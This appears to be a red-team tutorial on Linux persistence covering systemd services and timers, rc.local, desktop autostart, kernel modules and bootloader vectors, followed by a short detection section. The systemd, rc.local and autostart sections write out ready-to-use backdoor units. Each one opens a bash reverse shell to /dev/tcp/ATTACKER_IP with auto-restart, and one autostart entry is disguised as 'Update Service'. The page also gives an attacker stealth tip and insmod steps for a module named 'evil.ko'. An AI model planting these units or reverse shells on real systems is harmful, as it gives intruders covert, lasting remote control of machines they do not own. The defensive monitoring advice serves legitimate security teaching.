# Day 22 – Advanced Persistence: systemd timers, user services & kernel modules
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

## Objective
Learn advanced persistence techniques attackers use and how defenders can detect and mitigate them. Topics: systemd timers/user services, kernel module loading, rc.local/init scripts, autostart entries, and bootloader/firmware persistence vectors. All examples are for authorized lab use only.

---

## 1️⃣ systemd Units vs Timers
`systemd` provides flexible persistence through unit files and timers. Timers are the `systemd` equivalent of cron with more control and stealth.

### Create a persistent user service
```bash
# Create service in user unit directory
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/backdoor.service <<'EOF'
[Unit]
Description=User Backdoor Service

[Service]
ExecStart=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60
EOF

# Enable and start (user-level)
systemctl --user daemon-reload
systemctl --user enable --now backdoor.service
```

### Create a timer that runs every boot and hourly
```bash
cat > ~/.config/systemd/user/backdoor.timer <<'EOF'
[Unit]
Description=Run backdoor on boot and hourly

[Timer]
OnBootSec=1min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now backdoor.timer
```

**Notes:** User-level units persist across reboots and are less likely to be inspected than system units.

---

## 2️⃣ System-wide systemd Service Persistence
System services live in `/etc/systemd/system/`. Creating a unit requires root — but if you can write to this directory (or a service file is writable), you can achieve root persistence.

```bash
sudo tee /etc/systemd/system/sys-backdoor.service > /dev/null <<'EOF'
[Unit]
Description=Sys Backdoor

[Service]
Type=simple
ExecStart=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now sys-backdoor.service
```

---

## 3️⃣ systemd Timers (stealthier than cron)
Timers show as `systemctl list-timers`. They can be used to repeatedly execute payloads without using crontab files.
- Inspect timers: `systemctl list-timers --all`
- Timer files locations: `/etc/systemd/system/*.timer`, `/usr/lib/systemd/system/` and user `~/.config/systemd/user/*.timer`

**Stealth tip (attacker):** Use `OnCalendar` with complex expressions to avoid simple periodic detections.

---

## 4️⃣ rc.local, init scripts, and legacy boot persistence
Older systems or compatibility layers still honor `/etc/rc.local`. Writing to it gives persistence on boot (needs executable bit).

```bash
echo "/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1'" | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
```

Similarly, init scripts in `/etc/init.d/` can be abused where present.

---

## 5️⃣ Autostart Desktop Entries (GUI persistence)
On desktop systems, `.desktop` files in `~/.config/autostart/` persist on GUI login.

```bash
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/update.desktop <<'EOF'
[Desktop Entry]
Type=Application
Exec=/bin/bash -lc 'bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1'
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Update Service
EOF
```

---

## 6️⃣ Kernel Module / DKMS Persistence (advanced)
Kernel modules can give deep persistence. Loading a malicious module requires root, but if an attacker has root at any point, they can install a module or modify initramfs to load modules at boot.

- List loaded modules: `lsmod`
- Insert module: `sudo insmod evil.ko`
- Persistent install: place `.ko` in `/lib/modules/$(uname -r)/extra/` and run `depmod -a`
- Rebuild initramfs if needed: `sudo update-initramfs -u` (Debian/Ubuntu)

**DKMS:** Dynamic Kernel Module Support can rebuild modules across kernel updates — abusing DKMS allows long-term persistence across kernel upgrades.

**Danger:** Kernel modules run with kernel privileges — misuse can crash the system or create rootkits. Only in lab environments.

---

## 7️⃣ Bootloader & Firmware Persistence (extreme)
- **GRUB**: modifying `/etc/default/grub` or adding grub scripts can achieve early-boot persistence. Rebuilding grub config (`sudo update-grub`) applies changes.
- **Firmware (UEFI)**: Advanced attackers may write to UEFI variables or firmware, but this is highly risky and platform-specific.

---

## 8️⃣ Detection & Defensive Strategies
- Monitor for new systemd units: `auditd` rules watching `/etc/systemd/system` and `~/.config/systemd/user` changes.
- Watch timer changes: `systemctl list-timers --all` and alert on unknown timers.
- File integrity monitoring (AIDE, Tripwire) on: `/etc/systemd/`, `/etc/rc.local`, `/lib/modules/`, `/boot/`.
- Monitor kernel module insertions: `dmesg`, `journalctl -k`, and `modprobe` execs. Use `auditctl -w /sbin/insmod -p x` rules.
- Restrict write access: ensure only root can write to unit directories and module dirs.
- DKMS directories and package installations should be monitored and validated.

---

## 9️⃣ Practical Tasks (lab)
1. Create a **user-level systemd service + timer** that writes a timestamp to `/tmp/persist_test.log` every minute. Verify with `journalctl --user -u backdoor.service` and `systemctl --user list-timers`.
2. Simulate systemd hijack: create a service in `/etc/systemd/system/` on a lab VM and enable it. Observe `systemctl daemon-reload` and `systemctl status` outputs.
3. Build a dummy kernel module (example modules are available in kernel module programming tutorials) and `insmod` it in a disposable VM. Observe `lsmod` and `dmesg` output.
4. Check for autostart entries: `ls ~/.config/autostart/` and review `.desktop` files.

---

## 10️⃣ Ethics & Safety
These techniques are powerful and dangerous. Use strictly in controlled labs. Always obtain authorization for any testing on real systems.

---

## References & Further Reading
- `man systemd.unit`, `man systemd.service`, `man systemd.timer`  
- Kernel module programming guides  
- DKMS documentation  
- Auditd and auditctl guides for monitoring filesystem changes

---

📢 Follow **CyberSecPlayground** on Telegram for more persistence and red-team techniques: https://t.me/cybersecplayground
